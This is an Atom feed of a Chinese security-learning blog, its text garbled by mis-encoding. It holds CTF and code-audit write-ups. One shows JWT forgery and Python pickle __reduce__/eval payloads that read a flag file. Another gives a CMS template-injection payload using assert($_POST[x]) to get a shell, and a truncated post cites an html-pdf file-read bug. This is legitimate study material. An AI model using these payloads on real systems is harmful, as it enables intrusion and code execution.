    <content type="html"><![CDATA[<p> ç»å†äº†ä¸€ä¸ªä¸ŠåˆAWDçš„è¢«é”¤å</p><p>æœ‰ç‚¹å¿ƒç°æ„å†·</p><p>åšäº†å¥½å¤šé¢˜ç›®éƒ½æ˜¯è·Ÿç€wpåšçš„ï¼Œæ²¡æœ‰ä»€ä¹ˆæ”¶è·</p><p>æœ¬æ¥æ‰¾äº†ly0nå¤§ä½¬å–ç»äº†ä¸€ä¸‹ï¼Œç»“æœå‘ç°è‡ªå·±è¿˜æ˜¯åŸºç¡€æ²¡æ‰“å¥½</p><p>è¿™é“é¢˜è¿˜æ˜¯è·Ÿç€wpåšäº†ä¸€é</p><p>å…ˆè®°å½•ä¸€ä¸‹æ€è·¯</p><p>è¿›å»ä¹‹åæ˜¯ä¸ªè´­ç‰©é¡µé¢ï¼Œå¾ˆå¤š* li *liæ ‡å¿—å°ç”µè§†çš„å•†å“</p><p>æŒ‰ç…§æç¤ºï¼Œæˆ‘ä»¬éœ€è¦ä¹°lv6çš„æ‰è¡Œ</p><p>ç¿»é¡µå¯»æ‰¾äº†å¥½ä¹…éƒ½æ²¡æœ‰</p><p>åŸç†æ˜¯è¦ç”¨è„šæœ¬è·‘ä¸€ä¸‹å•Š</p><p>å¾ˆå¿«ï¼Œæ‰¾åˆ°äº†ç¬¬180é¡µæœ‰è¿™ä¸ªå•†å“</p><p>ä½†æ˜¯å¤ªè´µäº†ï¼Œè¿œè¿œè¶…å‡ºæˆ‘ä»¬çš„é’±åŒ…</p><p>äºæ˜¯æŠ“åŒ…æƒ³ä¿®æ”¹æŠ˜æ‰£è’™æ··è¿‡å…³</p><p>å¥½å®¶ä¼™ï¼Œè¯´æ²¡æœ‰ä»¥adminè®¿é—®ä¸è¡Œ</p><p>ç„¶åçŸ¥é“äº†è¦ä»jwtå…¥æ‰‹ï¼Œæˆ‘è§‰å¾—è¿™ä¸ªæœ‰ç‚¹åƒä»¤ç‰Œtokenå’Œcookieå§</p><p>å°±æ˜¯æµè§ˆå™¨ç”¨è¿™ä¸ªä¸œè¥¿æ¥è¯†åˆ«ä½ çš„èº«ä»½</p><p>è¿›å…¥jwtå®˜æ–¹é¡µé¢ä¿®æ”¹ä¹‹åæˆåŠŸè´­ä¹°</p><p>æŸ¥çœ‹æºç </p><p>æç¤ºæˆ‘ä»¬ä¸‹è½½æ–‡ä»¶</p><p>ä¸‹è½½ä¹‹åå°±æ˜¯éš¾ç‚¹pythonçš„pickleæ¼æ´</p><p><strong>æ¼æ´äº§ç”Ÿçš„åŸå› åœ¨äºå…¶å¯ä»¥å°†è‡ªå®šä¹‰çš„ç±»è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚ååºåˆ—åŒ–åäº§ç”Ÿçš„å¯¹è±¡ä¼šåœ¨ç»“æŸæ—¶è§¦å‘<strong>reduce</strong>()å‡½æ•°ä»è€Œè§¦å‘æ¶æ„ä»£ç ã€‚</strong></p><p>åšé¢˜ï¼š</p><p><img src="/2021/09/21/buu/22/image-20210924202100689.png" alt="image-20210924202100689"></p><p>æŒ‰ç…§æç¤ºï¼Œåˆ©ç”¨è„šæœ¬å¯»æ‰¾ä¸€ä¸‹lv6çš„è¸ªè¿¹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    url = <span class="string">&quot;http://06312721-18d2-4fee-bac0-d6591cf2e757.node4.buuoj.cn:81/shop?page=&#123;&#125;&quot;</span></span><br><span class="line">    url = url.format(i)</span><br><span class="line">    print(url)</span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;lv6.png&quot;</span> <span class="keyword">in</span> r.text <span class="keyword">and</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">        print(<span class="string">&quot;find it:&quot;</span> ,url)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><img src="/2021/09/21/buu/22/image-20210924202357414.png" alt="image-20210924202357414"></p><p>è®¿é—®page181</p><p><img src="/2021/09/21/buu/22/image-20210924202458922.png" alt="image-20210924202458922"></p><p>æ‰¾åˆ°è¿™ä¸ªåˆºå¤´äº†ï¼Œä¹°å®ƒï¼ï¼ï¼</p><p>ç»“æœï¼Œæ“ä½œå¤±è´¥hh</p><p><img src="/2021/09/21/buu/22/image-20210924202659335.png" alt="image-20210924202659335"></p><p>å·å·æ”¾è¿›æŠ“åŒ…é‡Œä¿®æ”¹é‡‘é¢</p><p><img src="/2021/09/21/buu/22/image-20210924203723295.png" alt="image-20210924203723295"></p><p>æç¤ºæˆ‘ä»¬éœ€è¦adminæƒé™å•Š</p><p>è·³è¿‡äº†å¾—åˆ°å¯†é’¥ä¸€æ­¥</p><p>JWTä¿®æ”¹</p><p><img src="/2021/09/21/buu/22/image-20210924204157770.png" alt="image-20210924204157770"></p><p>æˆåŠŸè®¿é—®</p><p><img src="/2021/09/21/buu/22/image-20210924204354932.png" alt="image-20210924204354932"></p><p><img src="/2021/09/21/buu/22/image-20210924204124430.png" alt="image-20210924204124430"></p><p>æŒ‰ç…§æç¤ºä¸‹è½½æºç </p><p>æŸ¥çœ‹ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">from</span> sshop.base <span class="keyword">import</span> BaseHandler</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdminHandler</span>(<span class="params">BaseHandler</span>):</span></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self, *args, **kwargs</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.current_user == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;no_ass.html&#x27;</span>)</span><br><span class="line"><span class="meta">@tornado.web.authenticated</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">post</span>(<span class="params">self, *args, **kwargs</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        become = self.get_argument(<span class="string">&#x27;become&#x27;</span>)</span><br><span class="line">        p = pickle.loads(urllib.unquote(become))</span><br><span class="line">        <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=p, member=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>æ¼æ´äº§ç”Ÿçš„åŸå› åœ¨äºå…¶å¯ä»¥å°†è‡ªå®šä¹‰çš„ç±»è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚ååºåˆ—åŒ–åäº§ç”Ÿçš„å¯¹è±¡ä¼šåœ¨ç»“æŸæ—¶è§¦å‘<strong>reduce</strong>()å‡½æ•°ä»è€Œè§¦å‘æ¶æ„ä»£ç ã€‚<br>å…¶å®ååºåˆ—åŒ–æ¼æ´æ€è·¯éƒ½æ˜¯å·®ä¸å¤šçš„<br>å°±æ˜¯æ‰¾åˆ°åºåˆ—åŒ–çš„å‚æ•°ï¼Œçœ‹ä»–å¯ä¸å¯ä»¥ä¿®æ”¹ï¼Œå¯ä»¥ä¿®æ”¹å°±å¯ä»¥è¿›è¡Œä»»æ„æ–‡ä»¶è¯»å–æˆ–è€…å‘½ä»¤æ‰§è¡Œ<br>è¿™é‡Œæˆ‘ä»¬å¯ä»¥ä¿®æ”¹becomeè¿™ä¸ªå‚æ•°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import urllib</span><br><span class="line">#python2</span><br><span class="line">class payload(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">       return (eval, (&quot;open(&#39;&#x2F;flag.txt&#39;,&#39;r&#39;).read()&quot;,))    #æ‰“å¼€è¯»å–flag.txtçš„å†…å®¹</span><br><span class="line"></span><br><span class="line">a &#x3D; pickle.dumps(payload())  #åºåˆ—åŒ–payload</span><br><span class="line">a &#x3D; urllib.quote(a)  #è¿›è¡Œurlç¼–ç </span><br><span class="line">print a</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import pickle</span><br><span class="line">import urllib</span><br><span class="line">#python3</span><br><span class="line">class exp(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        return (eval,(&quot;open(&#39;&#x2F;flag.txt&#39;).read()&quot;,))</span><br><span class="line"></span><br><span class="line">a&#x3D;exp()</span><br><span class="line">s&#x3D;pickle.dumps(a)</span><br><span class="line">print urllib.quote(s)</span><br></pre></td></tr></table></figure><p>payloadï¼š</p><p><img src="/2021/09/21/buu/22/image-20210924205124943.png" alt="image-20210924205124943"></p><p>ä¼ å…¥becomeå‚æ•°å³å¯</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt; ç»å†äº†ä¸€ä¸ªä¸ŠåˆAWDçš„è¢«é”¤å&lt;/p&gt;
&lt;p&gt;æœ‰ç‚¹å¿ƒç°æ„å†·&lt;/p&gt;
&lt;p&gt;åšäº†å¥½å¤šé¢˜ç›®éƒ½æ˜¯è·Ÿç€wpåšçš„ï¼Œæ²¡æœ‰ä»€ä¹ˆæ”¶è·&lt;/p&gt;
&lt;p&gt;æœ¬æ¥æ‰¾äº†ly0nå¤§ä½¬å–ç»äº†ä¸€ä¸‹ï¼Œç»“æœå‘ç°è‡ªå·±è¿˜æ˜¯åŸºç¡€æ²¡æ‰“å¥½&lt;/p&gt;
&lt;p&gt;è¿™é“é¢˜è¿˜æ˜¯è·Ÿç€wpåšäº†ä¸€é&lt;/p&gt;
&lt;p&gt;å…ˆè®°å½•ä¸€ä¸‹æ€è·¯&lt;/p&gt;
&lt;</summary>
      
    
    
    
    
    <category term="buu" scheme="http://daweitech.github.io/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>phpä»£ç å®¡è®¡(ä¸‰)</title>
    <link href="http://daweitech.github.io/2021/09/17/src/3/"/>
    <id>http://daweitech.github.io/2021/09/17/src/3/</id>
    <published>2021-09-17T12:20:23.000Z</published>
    <updated>2021-09-17T12:37:47.373Z</updated>
    
    <content type="html"><![CDATA[<p> è¿™æ¬¡è¯•ç€å°è¯•å®¡è®¡bluecmsæ¼æ´</p><p>å®‰è£…bluecmsçš„æ•™ç¨‹æ–‡ç« ï¼š</p><p><a href="https://blog.csdn.net/qq_41209264/article/details/106773255">æ¸—é€æµ‹è¯•â€”â€”bluecmså®‰è£…åŠseayä»£ç å®¡è®¡_fallingskies-CSDNåšå®¢</a></p><p><a href="https://www.cnblogs.com/wkzb/p/12732078.html">phpä»£ç å®¡è®¡]bluecms v1.6 sp1 - beiwo - åšå®¢å›­ (cnblogs.com)</a></p><p>é‡åˆ°çš„ä¸€ä¸ªå°å‘å°±æ˜¯è®¿é—®å®‰è£…é¡µé¢ä¸€ç›´ä¸ºç©ºç™½ï¼Œè¿˜å¥½è§£å†³å•¦</p><p>ä¸Šé¢çš„æ–‡ç« å·²ç»è®²è§£å¾—å¾ˆè¯¦ç»†äº†</p><p><img src="/2021/09/17/src/3/image-20210917202058053.png" alt="image-20210917202058053"></p><p>åˆ›å»ºæˆåŠŸå›¾å¦‚ä¸‹ï¼š</p><p><img src="/2021/09/17/src/3/image-20210917202743734.png" alt="image-20210917202743734"></p><p>è·Ÿç€å¤§ä½¬æ–‡ç« é˜…è¯»ï¼š</p><p>[<a href="https://www.cnblogs.com/wkzb/p/12732078.html">phpä»£ç å®¡è®¡]bluecms v1.6 sp1 - beiwo - åšå®¢å›­ (cnblogs.com)</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt; è¿™æ¬¡è¯•ç€å°è¯•å®¡è®¡bluecmsæ¼æ´&lt;/p&gt;
&lt;p&gt;å®‰è£…bluecmsçš„æ•™ç¨‹æ–‡ç« ï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/qq_41209264/article/details/106773255&quot;&gt;æ¸—é€æµ‹è¯•â€”â€”bluecmså®‰è£…åŠse</summary>
      
    
    
    
    
    <category term="php" scheme="http://daweitech.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>æ¼æ´æŒ–æ˜æ¼”ç»ƒ(ä¸€)</title>
    <link href="http://daweitech.github.io/2021/09/17/src/2/"/>
    <id>http://daweitech.github.io/2021/09/17/src/2/</id>
    <published>2021-09-17T07:14:27.000Z</published>
    <updated>2021-09-17T12:38:27.457Z</updated>
    
    <content type="html"><![CDATA[<p>ä»¥ä¸‹å†…å®¹å…¨éƒ¨æ¥è‡ªäºï¼šå®‰æ’ä¿¡æ¯</p><p>å…³äºcmsçš„æºç </p><p><img src="/2021/09/17/src/2/image-20210917152538626.png" alt="image-20210917152538626"></p><p>gitee.comä¸Šå¯ä»¥æ‰¾åˆ°å¾ˆå¤šèµ„æº</p><p>åŒæ ·githubä¹Ÿæ˜¯ã€‚</p><p>ä¾‹å­ä¸€ï¼š</p><p><img src="/2021/09/17/src/2/image-20210917153534213.png" alt="image-20210917153534213"></p><p>è§‚å¯Ÿä»¥ä¸Šä»£ç ï¼Œå‘ç°è¯¥phpæ–‡ä»¶æ˜æ˜¾æ˜¯è¯¥CMSçš„æ¨¡æ¿æ¸²æŸ“æ ¸å¿ƒä»£ç </p><p>å…¶ä¸­ï¼Œå¯¹å¤–è°ƒç”¨paser_stringå‡½æ•°ï¼Œæ ¸å¿ƒå‡½æ•°è¿è¡Œâ€”â€”parse,å¯¹å„ç§æ ‡ç­¾è¿›è¡Œè§£æã€‚</p><p>æ‰€ä»¥è”æƒ³åˆ°æ¨¡æ¿æ¸²æŸ“å¸¸å­˜åœ¨çš„SSTIæ¼æ´</p><p><img src="/2021/09/17/src/2/image-20210917153916987.png" alt="image-20210917153916987"></p><p>çœ‹åˆ°åœ¨å¤„ç†æ ‡ç­¾æ—¶è¿ç”¨è¯¸å¤ševal()å‡½æ•°</p><p>æ‰€ä»¥æ¥ä¸‹æ¥æ€è·¯ä¸ºï¼š</p><p>æ ¹æ®eval()å‡½æ•°ï¼Œè¿½è¸ªæº¯æºï¼Œçœ‹æ˜¯å¦å­˜åœ¨å¯æ§å˜é‡ã€‚</p><p>psï¼šæ²¡æœ‰å®¡è®¡ç»éªŒçš„äººï¼Œå»ºè®®æŠŠå…³é”®å‡½æ•°æå–å‡ºæ¥åˆ°æœ¬åœ°çš„PHPç¯å¢ƒè¿›è¡Œdebugè°ƒè¯•</p><p>ä¸»è¦æƒ³æ³•å°±æ˜¯ä¼ é€’ä»€ä¹ˆæ ·çš„å‚æ•°å¯ä»¥åœ¨evalä¸­æ‰§è¡Œï¼Œå¹¶ä¸”ç¡®å®ševalä¸­æ‰§è¡Œçš„ä»£ç æ˜¯å“ªä¸€å—ï¼Œæ˜¯å¦å¯æ§ã€‚</p><p>å‡è®¾ä¼ é€’{if:123}456{endif}</p><p>æ ¹æ®é€»è¾‘æ¨æ•²ï¼Œæœ€åä»£ç å›è¿›å…¥åˆ°è¯¥åˆ†æ”¯ä¸­</p><p>å¹¶ä¸”$strlfçš„å€¼æ˜¯123</p><p><img src="/2021/09/17/src/2/image-20210917154659350.png" alt="image-20210917154659350"></p><p>æ‰€ä»¥æœ€åèƒ½å¤Ÿæ„æˆ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(123)&#123;isFlag&#x3D;true;&#125;else&#123;isFalse&#125;;</span><br></pre></td></tr></table></figure><p>æ¥ç€ï¼Œå°±æ˜¯æ³¨å…¥ä»£ç æ¥getshelläº†</p><p>payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;if:1&#125;assert($_POST[x];&#x2F;&#x2F;)123&#123;endif&#125;</span><br></pre></td></tr></table></figure><p>æ‹¼æ¥åï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;if:1&#125;assert($_POST[x];&#x2F;&#x2F;)&#123;isFlag&#x3D;true;&#125;else&#123;isFalse&#125;;</span><br></pre></td></tr></table></figure><p>åˆ†æï¼š1ä¸ºæ°¸çœŸæ¡ä»¶ï¼Œ//å°†åé¢çš„æ³¨é‡Šäº†</p><p>æœ€åå°±æ‰§è¡Œäº†assert($_POST[x]);</p><p>æˆ‘ä»¬ç»§ç»­æ‰¾ä¼ é€’å‚æ•°çš„åœ°æ–¹</p><p>åå‘è¿½è¸ªï¼Œè°ƒç”¨labelif()å‡½æ•°çš„æ˜¯_parse(),è€Œ _parseåªè¢«parse_stringè°ƒç”¨</p><p><img src="/2021/09/17/src/2/image-20210917155446820.png" alt="image-20210917155446820"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;ä»¥ä¸‹å†…å®¹å…¨éƒ¨æ¥è‡ªäºï¼šå®‰æ’ä¿¡æ¯&lt;/p&gt;
&lt;p&gt;å…³äºcmsçš„æºç &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2021/09/17/src/2/image-20210917152538626.png&quot; alt=&quot;image-20210917152538626&quot;&gt;&lt;/p&gt;
&lt;p&gt;gite</summary>
      
    
    
    
    
    <category term="src" scheme="http://daweitech.github.io/tags/src/"/>
    
  </entry>
  
  <entry>
    <title>PHP and MySQL Web Development(äºŒ)</title>
    <link href="http://daweitech.github.io/2021/09/15/php/3/"/>
    <id>http://daweitech.github.io/2021/09/15/php/3/</id>
    <published>2021-09-15T13:19:28.000Z</published>
    <updated>2021-09-15T13:20:40.278Z</updated>
    
    
    
    
    
    <category term="php" scheme="http://daweitech.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>runoob.com-html(1)</title>
    <link href="http://daweitech.github.io/2021/09/13/web/0/"/>
    <id>http://daweitech.github.io/2021/09/13/web/0/</id>
    <published>2021-09-13T14:01:57.000Z</published>
    <updated>2021-09-14T08:38:25.388Z</updated>
    
    <content type="html"><![CDATA[<p>1.HTMLæ–‡æ¡£çš„åç¼€å</p><p>.html                .htm</p><p>2.å®ä¾‹è§£æ</p><p><img src="/2021/09/13/web/0/02A7DD95-22B4-4FB9-B994-DDB5393F7F03.jpg"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt; å£°æ˜ä¸º HTML5 æ–‡æ¡£</span><br><span class="line">&lt;html&gt; å…ƒç´ æ˜¯ HTML é¡µé¢çš„æ ¹å…ƒç´ </span><br><span class="line">&lt;head&gt; å…ƒç´ åŒ…å«äº†æ–‡æ¡£çš„å…ƒï¼ˆmetaï¼‰æ•°æ®ï¼Œå¦‚ &lt;meta charset&#x3D;&quot;utf-8&quot;&gt; å®šä¹‰ç½‘é¡µç¼–ç æ ¼å¼ä¸º utf-8ã€‚</span><br><span class="line">&lt;title&gt; å…ƒç´ æè¿°äº†æ–‡æ¡£çš„æ ‡é¢˜</span><br><span class="line">&lt;body&gt; å…ƒç´ åŒ…å«äº†å¯è§çš„é¡µé¢å†…å®¹</span><br><span class="line">&lt;h1&gt; å…ƒç´ å®šä¹‰ä¸€ä¸ªå¤§æ ‡é¢˜</span><br><span class="line">&lt;p&gt; å…ƒç´ å®šä¹‰ä¸€ä¸ªæ®µè½</span><br></pre></td></tr></table></figure><p>HTML æ˜¯ç”¨æ¥æè¿°ç½‘é¡µçš„ä¸€ç§è¯­è¨€ã€‚</p><p>HTML æŒ‡çš„æ˜¯è¶…æ–‡æœ¬æ ‡è®°è¯­è¨€: <strong>H</strong>yper<strong>T</strong>ext <strong>M</strong>arkup <strong>L</strong>anguage</p><p>HTMLæ ‡ç­¾</p><p>HTMLå…ƒç´ </p><p>HTMLç½‘é¡µç»“æ„</p><p><img src="/2021/09/13/web/0/image-20210913221500807.png" alt="image-20210913221500807"></p><p>æ–‡æ¡£æ ¼å¼ä¾‹å¦‚ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">  &lt;div&gt;åˆ†ç±»ç›®å½•...&lt;&#x2F;div&gt;</span><br><span class="line">  &lt;div&gt;å½“å‰åˆ†ç±»å†…å®¹åˆ—è¡¨...&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;div&gt; </span><br></pre></td></tr></table></figure><p>å¸¸ç”¨æ ‡ç­¾ä»‹ç»ï¼š</p><p>æ–‡æœ¬</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æœ€å¸¸ç”¨ï¼š&lt;font&gt;,ç”¨äºæ”¹å˜å­—ä½“ï¼Œå­—å·æ–‡å­—é¢œè‰²</span><br></pre></td></tr></table></figure><p>å›¾ç‰‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;hr&gt;æ ‡ç­¾ç”¨äºåœ¨é¡µé¢ä¸Šæ·»åŠ å›¾ç‰‡ï¼Œsrcå±æ€§æŒ‡å®šå›¾ç‰‡çš„åœ°å€ï¼Œå¦‚æœæ— æ³•æ‰“å¼€srcæŒ‡å®šçš„å›¾ç‰‡ï¼Œæµè§ˆå™¨é€šå¸¸ä¼šåœ¨é¡µé¢ä¸Šéœ€è¦æ˜¾ç¤ºå›¾ç‰‡çš„åœ°æ–¹æ˜¾ç¤ºaltå±æ€§å®šä¹‰çš„æ–‡æœ¬ã€‚</span><br><span class="line">&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;Icons&#x2F;valid-xhtml10&quot; alt&#x3D;&quot;å›¾ç‰‡ç®€ä»‹&quot; &#x2F;&gt; </span><br></pre></td></tr></table></figure><p>é“¾æ¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">è¶…çº§é“¾æ¥ç”¨&lt;a&gt;æ ‡ç­¾è¡¨ç¤ºï¼Œhrefå±æ€§æŒ‡å®šäº†é“¾æ¥åˆ°çš„åœ°å€ã€‚&lt;a&gt;æ ‡ç­¾å¯ä»¥åŒ…å«æ–‡æœ¬ï¼Œä¹Ÿå¯ä»¥åŒ…å«å›¾ç‰‡ã€‚</span><br><span class="line">&lt;a href&#x3D;&quot;http:&#x2F;&#x2F;www.runoob.com&#x2F;&quot;&gt;èœé¸Ÿæ•™ç¨‹&lt;&#x2F;a&gt;</span><br><span class="line">&lt;a href&#x3D;&quot;http:&#x2F;&#x2F;validator.w3.org&quot;&gt;&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;Icons&#x2F;valid-xhtml10&quot; alt&#x3D;&quot;éªŒè¯HTML&quot; &#x2F;&gt;&lt;&#x2F;a&gt; </span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;1.HTMLæ–‡æ¡£çš„åç¼€å&lt;/p&gt;
&lt;p&gt;.html                .htm&lt;/p&gt;
&lt;p&gt;2.å®ä¾‹è§£æ&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2021/09/13/web/0/02A7DD95-22B4-4FB9-B994-DDB5393F7F03.jpg&quot;&gt;</summary>
      
    
    
    
    
    <category term="web" scheme="http://daweitech.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>2021ç¥¥äº‘æ¯ secrets_of_admin&amp;crwaler_z</title>
    <link href="http://daweitech.github.io/2021/09/07/buu/21/"/>
    <id>http://daweitech.github.io/2021/09/07/buu/21/</id>
    <published>2021-09-07T02:52:39.000Z</published>
    <updated>2021-09-14T11:39:07.493Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/rfrder/article/details/119914746">ç¥¥äº‘æ¯2021 Webå¤ç°_fengçš„åšå®¢-CSDNåšå®¢</a></p><p>[ç¥¥äº‘æ¯2021 web wp | Z3ratu1â€™s blog](<a href="https://blog.z3ratu1.cn/%E7%A5%A5%E4%BA%91%E6%9D%AF2021">https://blog.z3ratu1.cn/ç¥¥äº‘æ¯2021</a> wp.html#more)</p><p><a href="https://cbatl.gitee.io/">ly0n - A hard-working boy (gitee.io)</a></p><p><a href="https://www.freebuf.com/articles/system/178150.html">Linuxä¸‹å‡ ç§åå¼¹Shellæ–¹æ³•çš„æ€»ç»“ä¸ç†è§£ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p><p><a href="https://www.wlhhlc.top/posts/20107/#cralwer-z">2021ç¥¥äº‘æ¯WEB-WP | dota_st (wlhhlc.top)</a></p><h4 id="secrets-of-admin"><a href="#secrets-of-admin" class="headerlink" title="secrets_of_admin"></a>secrets_of_admin</h4><p>æ‰“å¼€åé¡µé¢å¦‚ä¸‹ï¼š</p><p><img src="/2021/09/07/buu/21/image-20210908114725080.png" alt="image-20210908114725080"></p><p>database.jsé‡Œç›´æ¥ç»™å‡ºç”¨æˆ·åå’Œå¯†ç ï¼š</p><p>Usernameï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br></pre></td></tr></table></figure><p>Passwordï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e365655e013ce7fdbdbf8f27b418c8fe6dc9354dc4c0328fa02b0ea547659645</span><br></pre></td></tr></table></figure><p>ç™»å½•åå°±æœ‰äº†ä¸Šä¼ ç•Œé¢</p><p><img src="/2021/09/07/buu/21/image-20210908114945704.png" alt="image-20210908114945704"></p><p>æç¤ºæˆ‘ä»¬ä¸Šä¼ pdfç±»å‹çš„æ–‡ä»¶ï¼Œåˆåªèƒ½postä¼ å‚</p><p>ä»¥ä¸‹ç›´<code>files</code>è¡¨å¯ä»¥çŸ¥é“ï¼Œflagåœ¨<code>superuser</code>é‚£é‡Œï¼Œä½†æ˜¯<code>superuser</code>ä¸èƒ½ç”¨ã€‚é€šè¿‡ä¸‹é¢ä¸‰è¡Œä»£ç ä¹Ÿå¯ä»¥çŸ¥é“ï¼Œéœ€è¦æŠŠ<code>flag</code>ç»™<code>admin</code>ç”¨æˆ·æ¥æ‘˜æŠ„wpï¼ˆå› ä¸ºæˆ‘æ²¡æºç ï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">let filename &#x3D; await DB.getFile(token.username, req.params.id)</span><br><span class="line">         if (fs.existsSync(path.join(__dirname , &quot;..&#x2F;files&#x2F;&quot;, filename)))&#123;</span><br><span class="line">             return res.send(await readFile(path.join(__dirname , &quot;..&#x2F;files&#x2F;&quot;, filename)));</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä½†æ˜¯/api/files/åŠŸèƒ½é‚£é‡Œéœ€è¦SSRFã€‚</p><p>é€šè¿‡æŸ¥æ‰¾html-pdfåº“å‘ç°å®ƒå­˜åœ¨ä¸€ä¸ªä»»æ„æ–‡ä»¶è¯»å–ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">html-pdf before version 3.0.1 is vulnerable to Arbitrary File Read. The package fails to sanitize the HTML input, allowing attackers to 